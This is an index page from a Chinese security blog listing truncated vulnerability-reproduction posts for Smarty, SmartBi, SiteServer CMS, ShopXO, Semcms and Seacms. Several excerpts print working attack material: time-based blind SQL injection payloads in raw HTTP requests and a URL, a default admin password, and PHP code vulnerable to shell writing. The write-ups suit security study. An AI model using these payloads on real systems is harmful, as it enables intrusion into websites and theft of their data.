<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/page/43/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main">
  

    
    <article id="post-Smarty/（CVE-2017-1000480）Smarty_=3.1.31 命令执行RCE" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Smarty/%EF%BC%88CVE-2017-1000480%EF%BC%89Smarty_=3.1.31%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CRCE/" class="article-date">
  <time datetime="2022-07-08T06:26:03.717Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2017-1000480）Smarty-lt-3-1-31-命令执行RCE"><a href="#（CVE-2017-1000480）Smarty-lt-3-1-31-命令执行RCE" class="headerlink" title="（CVE-2017-1000480）Smarty&lt;=3.1.31 命令执行RCE"></a>（CVE-2017-1000480）Smarty&lt;=3.1.31 命令执行RCE</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在不清理模板名称的自定义资源上调用fetch（）或display（）函数时，3.1.32之前的Smarty<br>3容易受到PHP代码注入的攻击。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Smarty&lt;=3.1.31、3.1.32-dev</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="1、搭建环境"><a href="#1、搭建环境" class="headerlink" title="1、搭建环境"></a>1、搭建环境</h3><p>测试环境为： PHP5.6.40+Apache2+Smarty3.1.31+Debian9</p>
<pre><code>➜  html mkdir smarty
➜  html cd smarty
➜  smarty mkdir cache compile templates
➜  smarty composer require smarty/smarty -v
➜  smarty sed -i -e &#39;s/\^3.1/3.1.31/g&#39; composer.json
➜  smarty composer update
➜  smarty sudo chmod -R 777 .
</code></pre>
<p>/var/www/html/smarty/index.php 如下：</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Smarty/%EF%BC%88CVE-2017-1000480%EF%BC%89Smarty_=3.1.31%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CRCE/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Smarty/%EF%BC%88CVE-2017-1000480%EF%BC%89Smarty_=3.1.31%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CRCE/" data-id="cl5c2qvmu00gyy8v1ch7s9avj" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-SmartBi/SmartBi全版本 SQl注入 任意文件上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/SmartBi/SmartBi%E5%85%A8%E7%89%88%E6%9C%AC%20SQl%E6%B3%A8%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:03.672Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="SmartBi全版本-SQl注入-任意文件上传漏洞"><a href="#SmartBi全版本-SQl注入-任意文件上传漏洞" class="headerlink" title="SmartBi全版本 SQl注入 任意文件上传漏洞"></a>SmartBi全版本 SQl注入 任意文件上传漏洞</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Smarbi是由思迈特软件开发的一款企业级商业智能和大数据分析平台，满足用户在企业级报表、数据可视化分析、自助分析平台、数据挖掘建模、AI智能分析等大数据分析需求。致力于打造产品销售、产品整合、产品应用的生态系统，与上下游厂商、专业实施伙伴和销售渠道伙伴共同为最终用户服务，通过Smartbi应用商店（BI+行业应用）为客户提供场景化、行业化数据分析应用。通过官网可知国内大部分银行，央企，部委都部署有该系统。在一次安全评估项目中遇到该平台，在网上找到相关源码后遂对该平台进行分析审计，挖掘出了一些问题。</p>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>本来是想找个RCE的漏洞。但发现存在SQL注入。打开web.xml文件。发现一个FileResource类。感觉像是一个文件的读写类。我们追踪到class，然后看下类实现方法，通过浏览代码语法我们可以了解到该系统使用Servlet实现http的交互。这里简单的阐述一下Servlet的概念，方便后续理解。</p>
<p>大家都知道Servlet，但是不一定很清楚servlet框架，这个框架是由两个Java包组成:javax.servlet和javax.servlet.http，在javax.servlet包中定义了所有的Servlet类都必须实现或扩展的的通用接口和类，在javax.servlet.http包中定义了采用HTTP通信协议的HttpServlet类，Servlet的框架的核心是javax.servlet.Servlet接口,所有的Servlet都必须实现这一接口，在Servlet接口中定义了5个方法,如图琐事哦，其中前3个方法代表了Servlet的声明周期:</p>
<p>![](/resource/SmartBi全版本-SQl注入-任意文件上传漏洞/media/1.png)</p>
<p>当Web容器接收到某个Servlet请求时,Servlet把请求封装成一个HttpServletRequest对象,然后把对象传给Servlet的对应的服务方法。HTTP的请求方式包括DELETE,GET,OPTIONS,POST,PUT和TRACE,在HttpServlet类中分别提供了相应的服务方法,它们是,doDelete(),doGet(),doOptions(),doPost(), doPut()和doTrace().。当我们了解了这些前置知识后。大大的方便了我们理解接下来的代码。</p>
<p>![](/resource/SmartBi全版本-SQl注入-任意文件上传漏洞/media/2.png)</p>
<p>根据我们前面所了解到的一些前置知识。我们来看doGet方法的实现。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/SmartBi/SmartBi%E5%85%A8%E7%89%88%E6%9C%AC%20SQl%E6%B3%A8%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/SmartBi/SmartBi%E5%85%A8%E7%89%88%E6%9C%AC%20SQl%E6%B3%A8%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qvmt00gwy8v17jnx2oin" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-SiteServer/SiteServer CMS 5.0 管理后台Cookie欺骗" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/SiteServer/SiteServer%20CMS%205.0%20%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0Cookie%E6%AC%BA%E9%AA%97/" class="article-date">
  <time datetime="2022-07-08T06:26:03.667Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="SiteServer-CMS-5-0-管理后台Cookie欺骗"><a href="#SiteServer-CMS-5-0-管理后台Cookie欺骗" class="headerlink" title="SiteServer CMS 5.0 管理后台Cookie欺骗"></a>SiteServer CMS 5.0 管理后台Cookie欺骗</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>SiteServer CMS 5.0<br>后台访问控制采用JWT技术进行身份鉴别，HTTP请求时通过Cookie中的ss_administrator_access_token字段值作为身份鉴别，而加密ss_administrator_access_token字段值的key在安装时未进行随机初始化，导致所有相同版本的应用系统Cookie可以通用,通过修改Cookie可登陆任意相同版本后台。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>SiteServer CMS 5.0</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>系统环境：IIS 7.5 + MSSQL 2008 R2 （操作系统：Windows Server 2008 R2）</p>
<p>先访问一个站点，以官方体验站点为例子：</p>
<p><a target="_blank" rel="noopener" href="http://cms.demo.siteserver.cn/siteserver/login.aspx">http://cms.demo.siteserver.cn/siteserver/login.aspx</a></p>
<p>Chrome浏览器按F12切换到控制台，设置ss_administrator_access_token的Cookie值（以下PoC可以直接使用）：</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/SiteServer/SiteServer%20CMS%205.0%20%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0Cookie%E6%AC%BA%E9%AA%97/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/SiteServer/SiteServer%20CMS%205.0%20%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0Cookie%E6%AC%BA%E9%AA%97/" data-id="cl5c2qvip00g4y8v1fmcr0ry8" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-ShopXO/ShopXO v1.8.0 后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/ShopXO/ShopXO%20v1.8.0%20%E5%90%8E%E5%8F%B0getshell/" class="article-date">
  <time datetime="2022-07-08T06:26:03.630Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="ShopXO-v1-8-0-后台getshell"><a href="#ShopXO-v1-8-0-后台getshell" class="headerlink" title="ShopXO v1.8.0 后台getshell"></a>ShopXO v1.8.0 后台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ShopXO 小于v1.8.0</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>默认后台密码admin shopxo</p>
<p><img src="/resource/ShopXOv1.8.0%E5%90%8E%E5%8F%B0getshell/media/rId24.png"></p>
<p><img src="/resource/ShopXOv1.8.0%E5%90%8E%E5%8F%B0getshell/media/rId25.png"></p>
<p>登入后台-》应用中心-》应用商店-》主题</p>
<p>随便下载一个主题</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/ShopXO/ShopXO%20v1.8.0%20%E5%90%8E%E5%8F%B0getshell/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/ShopXO/ShopXO%20v1.8.0%20%E5%90%8E%E5%8F%B0getshell/" data-id="cl5c2qvlr00ggy8v19zwedubh" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Semcms/Semcms v3.8 sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Semcms/Semcms%20v3.8%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:03.540Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Semcms-v3-8-sql注入漏洞"><a href="#Semcms-v3-8-sql注入漏洞" class="headerlink" title="Semcms v3.8 sql注入漏洞"></a>Semcms v3.8 sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Semcms v3.8</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><blockquote>
<p>URL: <a target="_blank" rel="noopener" href="http://0-sec.org/123/sOWj5B_Admin/SEMCMS_Inquiry.php">http://0-sec.org/123/sOWj5B_Admin/SEMCMS_Inquiry.php</a></p>
<p><img src="/resource/Semcmsv3.8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png">{width=”5.833333333333333in”<br>height=”2.9166666666666665in”}Debug：Defense module is<br>class.phpmailer.php and function<br>inject_check_sql<img src="/resource/Semcmsv3.8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png">{width=”5.833333333333333in”<br>height=”0.4946084864391951in”}But VID[] didn&#39;t handle it</p>
</blockquote>
<ul>
<li>  POST</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
<pre><code>POST /123/sOWj5B_Admin/SEMCMS_Inquiry.php?Class=Deleted&amp;CF=Inquriy&amp;page= HTTP/1.1
Host: 0-sec.org
Content-Length: 24
Cache-Control: max-age=0
Origin: http://127.0.0.1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1/123/sOWj5B_Admin/SEMCMS_Inquiry.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: MEIQIA_EXTRA_TRACK_ID=1F7WZdk3rwHIzKqUfkrNaZ9t1EE; _ga=GA1.1.1842664860.1547715044; UM_distinctid=169c55686280-0636c606d502d3-36664c08-1fa400-169c556862b2e4; CNZZDATA1256162028=1606185978-1553793969-%7C1553793969; CNZZDATA1707573=cnzz_eid%3D987595238-1554794879-http%253A%252F%252F127.0.0.1%252F%26ntime%3D1554913098; PHPSESSID=n75nrqp26757vguhhgd4mlptd4; __51cke__=; __tins__4329483=%7B%22sid%22%3A%201556088941568%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201556090843766%7D; __51laig__=3; scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b
Connection: close

languageID=&amp;AID%5B%5D=3
</code></pre>
<p>image</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Semcms/Semcms%20v3.8%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Semcms/Semcms%20v3.8%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qvlo00gey8v1g3lhb0s8" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Semcms/Semcms v3.5 sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Semcms/Semcms%20v3.5%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:03.538Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Semcms-v3-5-sql注入漏洞"><a href="#Semcms-v3-5-sql注入漏洞" class="headerlink" title="Semcms v3.5 sql注入漏洞"></a>Semcms v3.5 sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Semcms v3.5</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在分析过程中看到网上已经有人发现semcms<br>V2.4存在过滤不严导致sql注入的漏洞，不知道咋还没改，而且最新版过滤的关键字更少了。</p>
<p>首先查看首页文件index.php的代码</p>
<pre><code>1 &lt;?php
2 include_once  &#39;Include/web_inc.php&#39;;
3 include_once  &#39;Templete/default/Include/Function.php&#39;;
4 $file_url=&quot;&quot;;
5 include_once  &#39;Templete/default/Include/default.php&#39;;
6 ?&gt;
 1 //网站logo
 2 
 3 $weblogo=$web_url_meate.str_replace(&#39;../&#39;,&#39;&#39;,$row[&#39;web_logo&#39;]);
 4 
 5 // 控制文字标签 更改 获取的 语种 id
 6 
 7 if (isset($_GET[&quot;languageIDD&quot;]))&#123;$Language=test_input(verify_str($_GET[&quot;languageIDD&quot;]));&#125;else&#123;$Language=verify_str($Language);&#125;
 8 
 9 if(!empty($Language))&#123;
10 
11       //网站SEO设定
12 
13       $query=$db_conn-&gt;query(&quot;select * from sc_tagandseo where languageID=$Language&quot;);
14       $row=mysqli_fetch_array($query);
15       $tag_indexmetatit=datato($row[&#39;tag_indexmetatit&#39;]);// 首页标题
 1 // 防sql入注
 2 
 3 if (isset($_GET))&#123;$GetArray=$_GET;&#125;else&#123;$GetArray=&#39;&#39;;&#125; 　　　　//所有GET方式提交的变量都进行防注入检查
 4  
 5 foreach ($GetArray as $value)&#123; //get
 6     
 7     verify_str($value);
 8   
 9 &#125;
10 
11 function inject_check_sql($sql_str) &#123;
12   
13      return preg_match(&#39;/select|insert|=|%|&lt;|between|update|\&#39;|\*|union|into|load_file|outfile/i&#39;,$sql_str);　　　　//过滤关键字
14 &#125; 
15 
16 function verify_str($str) &#123; 
17  
18    if(inject_check_sql($str)) &#123;
19    
20        exit(&#39;Sorry,You do this is wrong! (.-.)&#39;);　　　　　　//如果出现关键字则提示
21     &#125; 
22  
23     return $str; 
24 &#125;
 1 function test_input($data) &#123; 　　　　　　　　　　　　　　　　　　//防止XSS
 2       $data = str_replace(&quot;&lt;script&quot;, &quot;&quot;, $data);
 3       $data = str_replace(&quot;&lt;/script&gt;&quot;, &quot;&quot;, $data);
 4       $data = str_replace(&quot;%&quot;, &quot;percent&quot;, $data);
 5       $data = trim($data);
 6       $data = stripslashes($data);
 7       $data = htmlspecialchars($data,ENT_QUOTES);　　　　//实体编码
 8       return $data;
 9 
10    &#125;
</code></pre>
<p>　　可以看到第16行的函数verify_str()调用inject_check_sql()用来过滤危险字符，函数test_input用来过滤xss。其中可以明显地看到第11行的函数inject_check_sql()采用白名单的方式是有缺陷的，我们可以用布尔盲注来绕过</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Semcms/Semcms%20v3.5%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Semcms/Semcms%20v3.5%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qvlq00gfy8v14izpgswk" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Semcms/Semcms v2.7 密码找回漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Semcms/Semcms%20v2.7%20%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:03.536Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Semcms-v2-7-密码找回漏洞"><a href="#Semcms-v2-7-密码找回漏洞" class="headerlink" title="Semcms v2.7 密码找回漏洞"></a>Semcms v2.7 密码找回漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>SemCMS v2.7</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>先在本地搭建好环境。</p>
<p>访问后台登录页面如下：</p>
<p><img src="/resource/Semcmsv2.7%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
<p>先来看看正常的找回密码的过程。</p>
<p>首先，查看 tfmp_Admin/index.html 的源码：</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Semcms/Semcms%20v2.7%20%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Semcms/Semcms%20v2.7%20%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qvln00gdy8v1480z8o23" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Semcms/Semcms v2.7 sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Semcms/Semcms%20v2.7%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:03.534Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Semcms-v2-7-sql注入漏洞"><a href="#Semcms-v2-7-sql注入漏洞" class="headerlink" title="Semcms v2.7 sql注入漏洞"></a>Semcms v2.7 sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Semcms v2.7</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>http://0-sec.org/semcms/sbifr_Admin/SEMCMS_Banner.php?err=001&amp;lgid=1 and if(length(database()&gt;0),sleep(10),1) --
</code></pre>

        
          <p class="article-more-link">
            <a href="/2022/07/07/Semcms/Semcms%20v2.7%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Semcms/Semcms%20v2.7%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qvln00gcy8v15ien6xzp" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Semcms/Semcms PHP(多语)版 V3.9 sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Semcms/Semcms%20PHP(%E5%A4%9A%E8%AF%AD)%E7%89%88%20V3.9%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:03.531Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Semcms-PHP-多语-版-V3-9-sql注入漏洞"><a href="#Semcms-PHP-多语-版-V3-9-sql注入漏洞" class="headerlink" title="Semcms PHP(多语)版 V3.9 sql注入漏洞"></a>Semcms PHP(多语)版 V3.9 sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Semcms PHP(多语)版 V3.9</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p>漏洞文件为Include下的web_inc.php文件</p>
<p>包</p>
<pre><code>POST /Include/web_inc.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b
Upgrade-Insecure-Requests: 1
Content-Length: 64
Content-Type: application/x-www-form-urlencoded

languageID=0 or if(substr(database(),1,1) like 0x6D,sleep(5),1);
</code></pre>
<p>基于时间的注入</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Semcms/Semcms%20PHP(%E5%A4%9A%E8%AF%AD)%E7%89%88%20V3.9%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Semcms/Semcms%20PHP(%E5%A4%9A%E8%AF%AD)%E7%89%88%20V3.9%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qvlm00gby8v18akmavu3" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Seacms/Seacms 后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Seacms/Seacms%20%E5%90%8E%E5%8F%B0getshell/" class="article-date">
  <time datetime="2022-07-08T06:26:03.510Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="seacms-getshell"><a href="#seacms-getshell" class="headerlink" title="seacms getshell"></a>seacms getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>海洋cms是一款简单的php内容管理系统，主要用于视频网站，采用PHP+MYSQL架构，未使用框架</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>后台代码如下</p>
<pre><code>&lt;?php

header(&#39;Content-Type:text/html;charset=utf-8&#39;);

require_once(dirname(__FILE__).&quot;/config.php&quot;);

CheckPurview();

if($action==&quot;set&quot;)

&#123;

    $v= $_POST[&#39;v&#39;];

    $ip = $_POST[&#39;ip&#39;];

    $open=fopen(&quot;../data/admin/ip.php&quot;,&quot;w&quot; );

    $str=&#39;&lt;?php &#39;;

    $str.=&#39;$v = &quot;&#39;;

    $str.=&quot;$v&quot;;

    $str.=&#39;&quot;; &#39;;

    $str.=&#39;$ip = &quot;&#39;;

